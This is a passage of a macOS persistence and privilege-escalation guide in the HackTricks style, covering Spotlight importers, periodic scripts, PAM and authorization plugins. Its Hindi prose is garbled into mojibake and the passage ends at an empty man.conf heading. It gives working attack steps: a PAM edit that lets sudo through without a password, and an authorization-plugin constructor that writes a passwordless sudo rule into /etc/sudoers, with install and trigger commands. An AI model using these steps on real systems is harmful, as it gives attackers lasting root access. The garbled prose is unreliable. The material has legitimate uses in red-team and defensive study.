рдкреНрд▓рдЧрдЗрди рдпрд╛ **`.mdimporter`** рдмрдВрдбрд▓ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдЙрд▓реНрд▓рд┐рдЦрд┐рдд рд╕реНрдерд╛рдиреЛрдВ рдореЗрдВ рд╕реНрдерд┐рдд рд╣реЛрддреЗ рд╣реИрдВ рдФрд░ рдпрджрд┐ рдПрдХ рдирдпрд╛ рдмрдВрдбрд▓ рджрд┐рдЦрд╛рдИ рджреЗрддрд╛ рд╣реИ рддреЛ рдпрд╣ рдорд┐рдирдЯреЛрдВ рдХреЗ рднреАрддрд░ рд▓реЛрдб рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ (рдХрд┐рд╕реА рднреА рд╕реЗрд╡рд╛ рдХреЛ рдкреБрдирдГ рдкреНрд░рд╛рд░рдВрдн рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реЛрддреА рд╣реИ)ред рдЗрди рдмрдВрдбрд▓реЛрдВ рдХреЛ рдЗрдВрдбрд┐рдХреЗрдЯ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП рдХрд┐ рд╡реЗ рдХреМрди рд╕реЗ **рдлрд╝рд╛рдЗрд▓ рдкреНрд░рдХрд╛рд░ рдФрд░ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреЛ рдкреНрд░рдмрдВрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**, рдЗрд╕ рддрд░рд╣, рд╕реНрдкреЙрдЯрд▓рд╛рдЗрдЯ рдЙрдиреНрд╣реЗрдВ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдЧрд╛ рдЬрдм рдПрдХ рдирдИ рдлрд╝рд╛рдЗрд▓ рдЙрд▓реНрд▓рд┐рдЦрд┐рдд рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреЗ рд╕рд╛рде рдмрдирд╛рдИ рдЬрд╛рддреА рд╣реИред

рд╕рднреА рд▓реЛрдб рд╣реЛрдиреЗ рд╡рд╛рд▓реЗ `mdimporters` рдХреЛ рдЦреЛрдЬрдирд╛ рд╕рдВрднрд╡ рд╣реИ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛ рдЪрд▓рд╛ рдХрд░ рдкрд╛рдПрдВ:
```bash
mdimport -L
Paths: id(501) (
"/System/Library/Spotlight/iWork.mdimporter",
"/System/Library/Spotlight/iPhoto.mdimporter",
"/System/Library/Spotlight/PDF.mdimporter",
[...]
```
рдФрд░ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП **/Library/Spotlight/iBooksAuthor.mdimporter** рдЗрд╕ рддрд░рд╣ рдХреЗ рдлрд╝рд╛рдЗрд▓реЛрдВ (рдПрдХреНрд╕рдЯреЗрдВрд╢рди `.iba` рдФрд░ `.book` рдЖрджрд┐) рдХреЛ рдкрд╛рд░реНрд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ:
```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
0 => {
"CFBundleTypeName" => "iBooks Author Book"
"CFBundleTypeRole" => "MDImporter"
"LSItemContentTypes" => [
0 => "com.apple.ibooksauthor.book"
1 => "com.apple.ibooksauthor.pkgbook"
2 => "com.apple.ibooksauthor.template"
3 => "com.apple.ibooksauthor.pkgtemplate"
]
"LSTypeIsPackage" => 0
}
]
[...]
=> {
"UTTypeConformsTo" => [
0 => "public.data"
1 => "public.composite-content"
]
"UTTypeDescription" => "iBooks Author Book"
"UTTypeIdentifier" => "com.apple.ibooksauthor.book"
"UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
"UTTypeTagSpecification" => {
"public.filename-extension" => [
0 => "iba"
1 => "book"
]
}
}
[...]
```
{% hint style="danger" %}
рдпрджрд┐ рдЖрдк рдЕрдиреНрдп `mdimporter` рдХреЗ Plist рдХреА рдЬрд╛рдВрдЪ рдХрд░рддреЗ рд╣реИрдВ рддреЛ рдЖрдкрдХреЛ рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐ **`UTTypeConformsTo`** рдирд╣реАрдВ рдорд┐рд▓реЗрдЧреАред рдЗрд╕рд▓рд┐рдП рдпрд╣ рдПрдХ рдЕрдВрддрд░реНрдирд┐рд╣рд┐рдд _рдпреВрдирд┐рдлреЙрд░реНрдо рдЯрд╛рдЗрдк рдкрд╣рдЪрд╛рдирдХрд░реНрддрд╛_ ([UTI](https://en.wikipedia.org/wiki/Uniform\_Type\_Identifier)) рд╣реИ рдФрд░ рдЗрд╕реЗ рд╡рд┐рд╕реНрддрд╛рд░реЛрдВ рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реЛрддреА рд╣реИред

рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рд╕рд┐рд╕реНрдЯрдо рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдкреНрд▓рдЧрдЗрди рд╣рдореЗрд╢рд╛ рдкреНрд░рд╛рдердорд┐рдХрддрд╛ рджреЗрддреЗ рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреЗрд╡рд▓ рдЙрди рдлрд╝рд╛рдЗрд▓реЛрдВ рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддрд╛ рд╣реИ рдЬрд┐рдиреНрд╣реЗрдВ рдЕрдиреНрдпрдерд╛ Apple рдХреЗ рдЕрдкрдиреЗ `mdimporters` рджреНрд╡рд╛рд░рд╛ рд╕реВрдЪреАрдмрджреНрдз рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред
{% endhint %}

рдЕрдкрдирд╛ рдЦреБрдж рдХрд╛ рдЖрдпрд╛рддрдХрд░реНрддрд╛ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдЗрд╕ рдкреНрд░реЛрдЬреЗрдХреНрдЯ рд╕реЗ рд╢реБрд░реВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer) рдФрд░ рдлрд┐рд░ рдирд╛рдо, **`CFBundleDocumentTypes`** рдФрд░ **`UTImportedTypeDeclarations`** рдХреЛ рдмрджрд▓реЗрдВ рддрд╛рдХрд┐ рдпрд╣ рд╡рд╣ рд╡рд┐рд╕реНрддрд╛рд░ рд╕рдорд░реНрдерд┐рдд рдХрд░реЗрдВ рдЬрд┐рд╕реЗ рдЖрдк рд╕рдорд░реНрдерди рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдФрд░ рдЙрдиреНрд╣реЗрдВ **`schema.xml`** рдореЗрдВ рдкреНрд░рддрд┐рдмрд┐рдВрдмрд┐рдд рдХрд░реЗрдВред\
рдлрд┐рд░ **`GetMetadataForFile`** рдлрд╝рдВрдХреНрд╢рди рдХреЛрдб рдХреЛ **рдмрджрд▓реЗрдВ** рддрд╛рдХрд┐ рдЬрдм рдкреНрд░рд╕рдВрд╕реНрдХреГрдд рд╡рд┐рд╕реНрддрд╛рд░ рдХреЗ рд╕рд╛рде рдПрдХ рдлрд╝рд╛рдЗрд▓ рдмрдирд╛рдИ рдЬрд╛рддреА рд╣реИ, рддреЛ рдЖрдкрдХрд╛ рдкреЗрд▓реЛрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛред

рдЕрдВрдд рдореЗрдВ рдЕрдкрдирд╛ рдирдпрд╛ `.mdimporter` **рдмрдирд╛рдПрдВ рдФрд░ рдХреЙрдкреА рдХрд░реЗрдВ** рдЙрдкрд░реЛрдХреНрдд рд╕реНрдерд╛рдиреЛрдВ рдореЗрдВ рдФрд░ рдЖрдк рдЬрдм рднреА рдпрд╣ рд▓реЛрдб рд╣реЛрддрд╛ рд╣реИ рдЙрд╕реЗ рдЬрд╛рдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ **рд▓реЙрдЧреНрд╕ рдХреА рдирд┐рдЧрд░рд╛рдиреА** рдпрд╛ **`mdimport -L.`** рдХреА рдЬрд╛рдВрдЪ рдХрд░рдХреЗред

### ~~Preference Pane~~

{% hint style="danger" %}
рдРрд╕рд╛ рд▓рдЧрддрд╛ рдирд╣реАрдВ рд╣реИ рдХрд┐ рдпрд╣ рдЕрдм рдХрд╛рдо рдХрд░ рд░рд╣рд╛ рд╣реИред
{% endhint %}

рд▓реЗрдЦ: [https://theevilbit.github.io/beyond/beyond\_0009/](https://theevilbit.github.io/beyond/beyond\_0009/)

* рд╕реИрдВрдбрдмреЙрдХреНрд╕ рдХреЛ рдЫрд▓рдирд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА: [ЁЯЯа](https://emojipedia.org/large-orange-circle)
* рдЗрд╕реЗ рдПрдХ рд╡рд┐рд╢реЗрд╖ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреНрд░рд┐рдпрд╛ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ

#### рд╕реНрдерд╛рди

* **`/System/Library/PreferencePanes`**
* **`/Library/PreferencePanes`**
* **`~/Library/PreferencePanes`**

#### рд╡рд┐рд╡рд░рдг

рдРрд╕рд╛ рд▓рдЧрддрд╛ рдирд╣реАрдВ рд╣реИ рдХрд┐ рдпрд╣ рдЕрдм рдХрд╛рдо рдХрд░ рд░рд╣рд╛ рд╣реИред

## рд░реВрдЯ рд╕реИрдВрдбрдмреЙрдХреНрд╕ рдЫрд▓рдирд╛

{% hint style="success" %}
рдпрд╣рд╛рдВ рдЖрдкрдХреЛ **рд╕реИрдВрдбрдмреЙрдХреНрд╕ рдЫрд▓рдиреЗ** рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рд╢реБрд░реВ рд╕реНрдерд╛рди рдорд┐рд▓реЗрдВрдЧреЗ рдЬрд┐рд╕рд╕реЗ рдЖрдк рдХреЗрд╡рд▓ рдХреБрдЫ рдХреЛ **рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд▓рд┐рдЦрдХрд░** рдмрд╕ **рд░реВрдЯ** рд╣реЛрдХрд░ рдХреБрдЫ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░/рдпрд╛ рдЕрдиреНрдп **рдЕрдЬреАрдм рд╢рд░реНрддреЛрдВ** рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред
{% endhint %}

### рдЖрд╡рдзрд┐рдХ

рд▓реЗрдЦ: [https://theevilbit.github.io/beyond/beyond\_0019/](https://theevilbit.github.io/beyond/beyond\_0019/)

* рд╕реИрдВрдбрдмреЙрдХреНрд╕ рдХреЛ рдЫрд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА: [ЁЯЯа](https://emojipedia.org/large-orange-circle)
* рд▓реЗрдХрд┐рди рдЖрдкрдХреЛ рд░реВрдЯ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП

#### рд╕реНрдерд╛рди

* `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
* рд░реВрдЯ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ
* **рдЯреНрд░рд┐рдЧрд░**: рд╕рдордп рдЖрдиреЗ рдкрд░
* `/etc/daily.local`, `/etc/weekly.local` рдпрд╛ `/etc/monthly.local`
* рд░реВрдЯ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ
* **рдЯреНрд░рд┐рдЧрд░**: рд╕рдордп рдЖрдиреЗ рдкрд░

#### рд╡рд┐рд╡рд░рдг рдФрд░ рд╢реЛрд╖рдг

рдЖрд╡рдзрд┐рдХ рд╕реНрдХреНрд░рд┐рдкреНрдЯ (**`/etc/periodic`**) рдХреЛ **рд▓реЙрдиреНрдЪ рдбреЗрдорди** рдХреЗ рдХрд╛рд░рдг рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬреЛ `/System/Library/LaunchDaemons/com.apple.periodic*` рдореЗрдВ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдП рдЧрдП рд╣реЛрддреЗ рд╣реИрдВред рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ `/etc/periodic/` рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рд╕реНрдХреНрд░рд┐рдкреНрдЯ **рдлрд╝рд╛рдЗрд▓ рдХреЗ рдорд╛рд▓рд┐рдХ рдХреЗ рд░реВрдк рдореЗрдВ рдирд┐рд╖реНрдкрд╛рджрд┐рдд** рд╣реЛрддреЗ рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП рдпрд╣ рдХрд┐рд╕реА рд╕рдВрднрд╛рд╡рд┐рдд рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдЙрдиреНрдирдпрди рдХреЗ рд▓рд┐рдП рдХрд╛рдо рдирд╣реАрдВ рдХрд░реЗрдЧрд╛ред

{% code overflow="wrap" %}
```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```
{% endcode %}

рд╡рд╣рд╛рдБ рдЕрдиреНрдп рдЖрд╡рдзрд┐рдХ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд╣реИрдВ рдЬреЛ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рдд рд╣реЛрдВрдЧреЗ рдЬреЛ **`/etc/defaults/periodic.conf`** рдореЗрдВ рджрд┐рдЦрд╛рдП рдЧрдП рд╣реИрдВ:
```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```
рдпрджрд┐ рдЖрдк `/etc/daily.local`, `/etc/weekly.local` рдпрд╛ `/etc/monthly.local` рдлрд╝рд╛рдЗрд▓реЛрдВ рдореЗрдВ рд╕реЗ рдХрд┐рд╕реА рднреА рдлрд╝рд╛рдЗрд▓ рдХреЛ рд▓рд┐рдЦрдиреЗ рдореЗрдВ рд╕рдлрд▓ рд╣реЛрддреЗ рд╣реИрдВ, рддреЛ рдпрд╣ **рдЬрд▓реНрдж рд╣реА рдпрд╛ рдмрд╛рдж рдореЗрдВ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдЧреА**ред

{% hint style="warning" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЖрд╡рдзрд┐рдХ рд╕реНрдХреНрд░рд┐рдкреНрдЯ **рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЗ рдорд╛рд▓рд┐рдХ рдХреЗ рд░реВрдк рдореЗрдВ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдЧреА**ред рдЗрд╕рд▓рд┐рдП рдпрджрд┐ рдПрдХ рд╕рд╛рдорд╛рдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХрд╛ рдорд╛рд▓рд┐рдХ рд╣реИ, рддреЛ рдпрд╣ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдЧреА (рдпрд╣ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдмрдврд╝рд╛рдиреЗ рдХреЗ рд╣рдорд▓реЛрдВ рдХреЛ рд░реЛрдХ рд╕рдХрддрд╛ рд╣реИ)ред
{% endhint %}

### PAM

Writeup: [Linux Hacktricks PAM](../linux-hardening/linux-post-exploitation/pam-pluggable-authentication-modules.md)\
Writeup: [https://theevilbit.github.io/beyond/beyond\_0005/](https://theevilbit.github.io/beyond/beyond\_0005/)

* рд╕реИрдВрдбрдмреЙрдХреНрд╕ рдХреЛ рдЕрдирджреЗрдЦрд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА: [ЁЯЯа](https://emojipedia.org/large-orange-circle)
* рд▓реЗрдХрд┐рди рдЖрдкрдХреЛ рд░реВрдЯ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП

#### рд╕реНрдерд╛рди

* рд╣рдореЗрд╢рд╛ рд░реВрдЯ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ

#### рд╡рд┐рд╡рд░рдг рдФрд░ рд╢реЛрд╖рдг

PAM рдЕрдзрд┐рдХрддрдо рд░реВрдк рд╕реЗ **рд╕реНрдерд╛рдпрд┐рддреНрд╡** рдФрд░ рдореИрд▓рд╡реЗрдпрд░ рдкрд░ рдзреНрдпрд╛рди рдХреЗрдВрджреНрд░рд┐рдд рд╣реЛрддрд╛ рд╣реИ рдЬреЛ macOS рдореЗрдВ рдЖрд╕рд╛рди рдирд┐рд╖реНрдкрд╛рджрди рдкрд░ред рдЗрд╕ рдмреНрд▓реЙрдЧ рдореЗрдВ рдПрдХ рд╡рд┐рд╕реНрддреГрдд рд╡реНрдпрд╛рдЦреНрдпрд╛ рдирд╣реАрдВ рджреА рдЬрд╛рдПрдЧреА, **рдЗрд╕ рддрдХрдиреАрдХ рдХреЛ рдмреЗрд╣рддрд░ рд╕рдордЭрдиреЗ рдХреЗ рд▓рд┐рдП рд╡реНрд░рд╛рдЗрдЯрдЕрдк рдкрдврд╝реЗрдВ**ред

PAM рдореЙрдбреНрдпреВрд▓реНрд╕ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ:&#x20;
```bash
ls -l /etc/pam.d
```
рдПрдХ persistence/privilege escalation рддрдХрдиреАрдХ PAM рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рддреА рд╣реИ рдЬреЛ рдмрд╣реБрдд рд╣реА рдЖрд╕рд╛рди рд╣реИ, рдмрд╕ /etc/pam.d/sudo рдореЙрдбреНрдпреВрд▓ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдХреЗ рдкрд╣рд▓реЗ рд▓рд╛рдЗрди рдореЗрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд▓рд╛рдЗрди рдЬреЛрдбрд╝рдиреА рд╣реЛрдЧреА:
```bash
auth       sufficient     pam_permit.so
```
рдЗрд╕рд▓рд┐рдП рдпрд╣ **рдРрд╕рд╛ рджрд┐рдЦреЗрдЧрд╛**:
```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```
рдФрд░ рдЗрд╕рд▓рд┐рдП **`sudo` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕** рдХреЛрдИ рднреА рдХрд╛рдо рдХрд░реЗрдЧрд╛ред

{% hint style="danger" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрд╣ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ TCC рджреНрд╡рд╛рд░рд╛ рд╕рдВрд░рдХреНрд╖рд┐рдд рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдкрд╣реБрдВрдЪ рдХреЗ рд▓рд┐рдП рдкреВрдЫрддрд╛рдЫ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░реЙрдореНрдкреНрдЯ рдорд┐рд▓рдиреЗ рдХреА рдЕрдзрд┐рдХ рд╕рдВрднрд╛рд╡рдирд╛ рд╣реИред
{% endhint %}

### рдЕрдзрд┐рдХреГрддрддрд╛ рдкреНрд▓рдЧрдЗрди

рд▓реЗрдЦ: [https://theevilbit.github.io/beyond/beyond\_0028/](https://theevilbit.github.io/beyond/beyond\_0028/)\
рд▓реЗрдЦ: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)

* рд╕реИрдВрдбрдмреЙрдХреНрд╕ рдХреЛ рдмрд╛рдИрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА: [ЁЯЯа](https://emojipedia.org/large-orange-circle)
* рд▓реЗрдХрд┐рди рдЖрдкрдХреЛ рд░реВрдЯ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП рдФрд░ рдЕрддрд┐рд░рд┐рдХреНрдд рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХрд░рдиреА рд╣реЛрдЧреА

#### рд╕реНрдерд╛рди

* `/Library/Security/SecurityAgentPlugins/`
* рд░реВрдЯ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ
* рдЕрдзрд┐рдХреГрддрддрд╛ рдбреЗрдЯрд╛рдмреЗрд╕ рдХреЛ рдкреНрд▓рдЧрдЗрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рднреА рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░рдирд╛ рдЖрд╡рд╢реНрдпрдХ рд╣реИ

#### рд╡рд┐рд╡рд░рдг рдФрд░ рд╢реЛрд╖рдг

рдЖрдк рдПрдХ рдЕрдзрд┐рдХреГрддрддрд╛ рдкреНрд▓рдЧрдЗрди рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рд╕реНрдерд┐рд░рддрд╛ рдмрдирд╛рдП рд░рдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд▓реЙрдЧ-рдЗрди рдХрд░рддреЗ рд╕рдордп рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдЧрд╛ред рдЗрди рдкреНрд▓рдЧрдЗрдиреНрд╕ рдХреЛ рдХреИрд╕реЗ рдмрдирд╛рдПрдВ рдЗрд╕рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рдкрд┐рдЫрд▓реЗ рд▓реЗрдЦреЛрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ (рдФрд░ рд╕рд╛рд╡рдзрд╛рди рд░рд╣реЗрдВ, рдПрдХ рдЦрд░рд╛рдм рддрд░реАрдХреЗ рд╕реЗ рд▓рд┐рдЦрд╛ рдЧрдпрд╛ рдкреНрд▓рдЧрдЗрди рдЖрдкрдХреЛ рдмрд╛рд╣рд░ рдмрдВрдж рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЖрдкрдХреЛ рдЕрдкрдиреЗ рдореИрдХ рдХреЛ рд░рд┐рдХрд╡рд░реА рдореЛрдб рд╕реЗ рд╕рд╛рдлрд╝ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреА)ред
```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```
**рдмрдВрдбрд▓** рдХреЛ рд▓реЛрдб рд╣реЛрдиреЗ рд╡рд╛рд▓реЗ рд╕реНрдерд╛рди рдкрд░ **рдореВрд╡** рдХрд░реЗрдВ:
```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```
рдЕрдВрдд рдореЗрдВ рдЗрд╕ рдкреНрд▓рдЧрдЗрди рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рдирд┐рдпрдо** рдЬреЛрдбрд╝реЗрдВ:
```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>class</key>
<string>evaluate-mechanisms</string>
<key>mechanisms</key>
<array>
<string>CustomAuth:login,privileged</string>
</array>
</dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```
**`evaluate-mechanisms`** рдЕрдзрд┐рдХреГрддрд┐ рдлреНрд░реЗрдорд╡рд░реНрдХ рдХреЛ рд╕реВрдЪрд┐рдд рдХрд░реЗрдЧрд╛ рдХрд┐ рдЙрд╕реЗ **рдЕрдзрд┐рдХреГрддрд┐ рдХреЗ рд▓рд┐рдП рдПрдХ рдмрд╛рд╣рд░реА рдпрдВрддреНрд░ рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреА**ред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, **`privileged`** рдЗрд╕реЗ рд░реВрдЯ рджреНрд╡рд╛рд░рд╛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░реЗрдЧрд╛ред

рдЗрд╕реЗ рдЯреНрд░рд┐рдЧрд░ рдХрд░реЗрдВ:
```bash
security authorize com.asdf.asdf
```
рдФрд░ рдлрд┐рд░ **рд╕реНрдЯрд╛рдл рдЧреНрд░реБрдк рдХреЛ sudo рдПрдХреНрд╕реЗрд╕ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП** (рдкрдврд╝реЗрдВ `/etc/sudoers` рдХреЛ рдХрдиреНрдлрд░реНрдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП)ред

### Man.conf

Writeup: [https://theevilbit.github.io/beyond/beyond\_0030/](https://theevilbit.github.io/beyond/beyond\_0030/)

* рд╕реИрдВрдбрдмреЙрдХреНрд╕ рдХреЛ рдмрд╛рдИрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА: [ЁЯЯа](https://emojipedia.org/large-orange-circle)
* рд▓реЗрдХрд┐рди рдЖрдкрдХреЛ рд░реВрдЯ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП рдФрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ man рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП

#### рд╕реНрдерд╛рди

* **`/private/etc/man.conf`**
* рд░реВрдЯ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ
* **`/private/etc/man.conf`**: рд╣рд░ рдмрд╛рд░ man рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ

#### рд╡рд┐рд╡рд░рдг рдФрд░ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ

